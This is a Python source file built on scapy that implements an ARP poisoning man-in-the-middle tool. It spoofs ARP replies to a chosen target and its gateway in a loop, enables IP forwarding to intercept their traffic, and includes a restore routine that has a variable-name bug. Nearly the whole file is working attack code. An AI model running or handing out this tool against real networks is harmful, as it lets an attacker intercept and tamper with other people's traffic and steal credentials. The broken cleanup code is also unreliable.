from scapy.all import *
import threading
import time
import logging
import subprocess
from utils import print_status, enable_ip_forwarding
import config

class ARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface=config.INTERFACE):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = False
        self.thread = None
        
        # Get MAC addresses
        self.target_mac = getmacbyip(target_ip)
        self.gateway_mac = getmacbyip(gateway_ip)
        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)
        
        if not self.target_mac or not self.gateway_mac:
            raise ValueError("Could not resolve MAC addresses")
        
        # Safety check: Don't poison ourselves
        if target_ip == self.attacker_ip or gateway_ip == self.attacker_ip:
            raise ValueError("Cannot poison own machine's ARP cache")
        
        print_status(f"Target MAC: {self.target_mac}", "info")
        print_status(f"Gateway MAC: {self.gateway_mac}", "info")
        print_status(f"Attacker MAC: {self.attacker_mac}", "info")
        print_status(f"Attacker IP: {self.attacker_ip}", "info")

        # Enable IP forwarding
        if not enable_ip_forwarding():
            print_status("Failed to enable IP forwarding. Attack may not work properly.", "warning")

    def start(self):
        """Start ARP poisoning attack."""
        if self.running:
            print_status("Attack already running", "warning")
            return False

        self.running = True
        self.thread = threading.Thread(target=self._poison)
        self.thread.daemon = True
        self.thread.start()
        print_status(f"Started ARP poisoning attack on {self.target_ip}", "success")
        return True

    def stop(self):
        """Stop ARP poisoning attack and restore ARP tables."""
        if not self.running:
            return False

        self.running = False
        if self.thread:
            self.thread.join()
        
        # Restore ARP tables
        try:
            # Send legitimate ARP replies to target
            send(ARP(op=2, pdst=self.target_ip, hwdst=target_mac, 
                    psrc=self.gateway_ip, hwsrc=gateway_mac), 
                 count=5, verbose=0, iface=self.interface)
            
            # Send legitimate ARP replies to gateway
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, 
                    psrc=self.target_ip, hwsrc=self.target_mac), 
                 count=5, verbose=0, iface=self.interface)
            
            # Send gratuitous ARP to restore gateway's MAC
            send(ARP(op=2, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                 count=5, verbose=0, iface=self.interface)
            
            print_status("Restored ARP tables", "success")
        except Exception as e:
            print_status(f"Error restoring ARP tables: {e}", "error")
            logging.error(f"Error restoring ARP tables: {e}")

    def _poison(self):
        """Main poisoning loop."""
        while self.running:
            try:
                # Poison target to think we're the gateway
                send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                        psrc=self.gateway_ip, hwsrc=self.attacker_mac),
                     verbose=0, iface=self.interface)
                
                # Poison gateway to think we're the target
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                        psrc=self.target_ip, hwsrc=self.attacker_mac),
                     verbose=0, iface=self.interface)
                
                time.sleep(config.ARP_POISON_INTERVAL)
            except Exception as e:
                print_status(f"Error in ARP poisoning: {e}", "error")
                logging.error(f"Error in ARP poisoning: {e}")
                self.running = False
                break

def run_attack(target_ip, gateway_ip):
    """Run ARP poisoning attack with proper cleanup."""
    try:
        poisoner = ARPPoisoner(target_ip, gateway_ip)
        poisoner.start()
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("\nStopping attack...", "warning")
            poisoner.stop()
            
    except Exception as e:
        print_status(f"Error: {e}", "error")
        logging.error(f"Error in ARP poisoning attack: {e}")
        return False
    
    return True 